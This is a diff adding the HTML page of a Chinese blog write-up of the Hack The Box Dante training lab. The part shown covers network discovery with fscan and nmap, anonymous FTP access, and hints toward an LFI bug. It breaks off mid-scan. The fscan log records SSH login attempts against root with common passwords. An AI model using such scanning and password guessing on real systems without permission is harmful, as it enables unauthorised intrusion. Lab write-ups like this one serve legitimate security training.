@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言最近忍痛买了HTB的pro labs， 购买之后可以打任何lab，还是挺划算的。这篇文章对Dante实验室作个简单的记录，不会提供任何一台机子的flag，只是给打靶又卡住了的师傅们提供一个解题的思路。建议还是自己亲自去打才能学到更多东西。getshell、提权以及横向的其他方式，师傅们可以自行研究。 注： 写这篇文章的时候，因为网络原因，重换了几次htb的vpn server，所以可能存在前后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Dante Walkthrough">
+<meta property="og:url" content="https://r4inb00w.github.io/2023/05/15/htb-dante/index.html">
+<meta property="og:site_name" content="rainb0w">
+<meta property="og:description" content="前言最近忍痛买了HTB的pro labs， 购买之后可以打任何lab，还是挺划算的。这篇文章对Dante实验室作个简单的记录，不会提供任何一台机子的flag，只是给打靶又卡住了的师傅们提供一个解题的思路。建议还是自己亲自去打才能学到更多东西。getshell、提权以及横向的其他方式，师傅们可以自行研究。 注： 写这篇文章的时候，因为网络原因，重换了几次htb的vpn server，所以可能存在前后">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg">
+<meta property="article:published_time" content="2023-05-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-10T01:15:41.155Z">
+<meta property="article:author" content="rainb0w">
+<meta property="article:tag" content="hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Dante Walkthrough</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/06/JavaRASP/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/05/15/htb-dante/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&text=HTB Dante Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&is_video=false&description=HTB Dante Walkthrough"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Dante Walkthrough&body=Check out this article: https://r4inb00w.github.io/2023/05/15/htb-dante/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&title=HTB Dante Walkthrough"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/05/15/htb-dante/&name=HTB Dante Walkthrough&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/05/15/htb-dante/&t=HTB Dante Walkthrough"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E9%9D%B6"><span class="toc-number">2.</span> <span class="toc-text">打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">存活主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I%E2%80%99m-nuts-and-bolts-about-you"><span class="toc-number">2.2.</span> <span class="toc-text">I’m nuts and bolts about you</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-easier-this-way"><span class="toc-number">2.3.</span> <span class="toc-text">It’s easier this way</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Show-me-the-way"><span class="toc-number">2.4.</span> <span class="toc-text">Show me the way</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seclusion-is-an-illusion"><span class="toc-number">2.5.</span> <span class="toc-text">Seclusion is an illusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snake-it-%E2%80%98til-you-make-it"><span class="toc-number">2.6.</span> <span class="toc-text">Snake it ‘til you make it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Feeling-fintastic"><span class="toc-number">2.7.</span> <span class="toc-text">Feeling fintastic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Let%E2%80%99s-take-this-discussion-elsewhere"><span class="toc-number">2.8.</span> <span class="toc-text">Let’s take this discussion elsewhere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compare-my-numbers"><span class="toc-number">2.9.</span> <span class="toc-text">Compare my numbers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Again-and-again"><span class="toc-number">2.10.</span> <span class="toc-text">Again and again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Five-doctors"><span class="toc-number">2.11.</span> <span class="toc-text">Five doctors</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Minus-minus-plus"><span class="toc-number">2.12.</span> <span class="toc-text">Minus + minus &#x3D; plus?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Congratulations-to-a-perfect-pear"><span class="toc-number">2.13.</span> <span class="toc-text">Congratulations to a perfect pear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MinatoTW-strikes-again"><span class="toc-number">2.14.</span> <span class="toc-text">MinatoTW strikes again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#That-just-blew-my-mind"><span class="toc-number">2.15.</span> <span class="toc-text">That just blew my mind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Update-the-policy"><span class="toc-number">2.16.</span> <span class="toc-text">Update the policy!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Single-or-double-quotes"><span class="toc-number">2.17.</span> <span class="toc-text">Single or double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-open-goal"><span class="toc-number">2.18.</span> <span class="toc-text">An open goal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-getting-hot-in-here"><span class="toc-number">2.19.</span> <span class="toc-text">It’s getting hot in here</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-misconfig-to-rule-them-all"><span class="toc-number">2.20.</span> <span class="toc-text">One misconfig to rule them all</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#We%E2%80%99re-going-in-circles"><span class="toc-number">2.21.</span> <span class="toc-text">We’re going in circles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-cup-runneth-over"><span class="toc-number">2.22.</span> <span class="toc-text">My cup runneth over</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-do-we-have-here"><span class="toc-number">2.23.</span> <span class="toc-text">What do we have here?!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It-doesn%E2%80%99t-get-any-easier-than-this"><span class="toc-number">2.24.</span> <span class="toc-text">It doesn’t get any easier than this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail-2-The-Sequel"><span class="toc-number">2.25.</span> <span class="toc-text">Fail 2: The Sequel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I-prefer-mine-with-the-skins-on"><span class="toc-number">2.26.</span> <span class="toc-text">I prefer mine with the skins on</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6"><span class="toc-number">3.</span> <span class="toc-text">证书</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Dante Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">rainb0w</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-15T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-05-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/hackthebox/" rel="tag">hackthebox</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忍痛买了HTB的pro labs， 购买之后可以打任何lab，还是挺划算的。这篇文章对Dante实验室作个简单的记录，不会提供任何一台机子的flag，只是给打靶又卡住了的师傅们提供一个解题的思路。建议还是自己亲自去打才能学到更多东西。getshell、提权以及横向的其他方式，师傅们可以自行研究。</p>
+<p>注： 写这篇文章的时候，因为网络原因，重换了几次htb的vpn server，所以可能存在前后IP不同的情况。</p>
+<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>dante给的网段是10.10.110.0&#x2F;24，直接fscan扫，扫描结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 10.10.110.0/24                        </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.110.2     is alive</span><br><span class="line">(icmp) Target 10.10.110.100   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.10.110.100:21 open</span><br><span class="line">10.10.110.100:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp://10.10.110.100:21:anonymous </span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root root@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root abc123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Aa123456 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 2/2</span><br><span class="line">[*] 扫描结束,耗时: 7m8.392454575s</span><br></pre></td></tr></table></figure>
+
+<h3 id="I’m-nuts-and-bolts-about-you"><a href="#I’m-nuts-and-bolts-about-you" class="headerlink" title="I’m nuts and bolts about you"></a>I’m nuts and bolts about you</h3><p>可以看到10.10.110.100这台机子可以匿名访问：</p>
+<p><img src="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg"></p>
+<p>下载之后，有一个todo.txt，这是它的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- Finalize WordPress permission changes - PENDING</span><br><span class="line">- Update links to to utilize DNS Name prior to changing to port 80 - PENDING</span><br><span class="line">- Remove LFI vuln from the other site - PENDING</span><br><span class="line">- Reset James&#x27; password to something more secure - PENDING</span><br><span class="line">- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS</span><br></pre></td></tr></table></figure>
+
+<p>有以下几点提示需要注意：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个部署着wordpress的站点，用户的权限需要更改</span><br><span class="line">别的站点存在LFI漏洞</span><br><span class="line">james的密码可能容易被爆破出来</span><br></pre></td></tr></table></figure>
+
+<p>之后我们用nmap扫一下10.10.110.100：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.110.100  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 04:08 EDT</span><br><span class="line">Nmap scan report for 10.10.110.100</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.14.6</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login 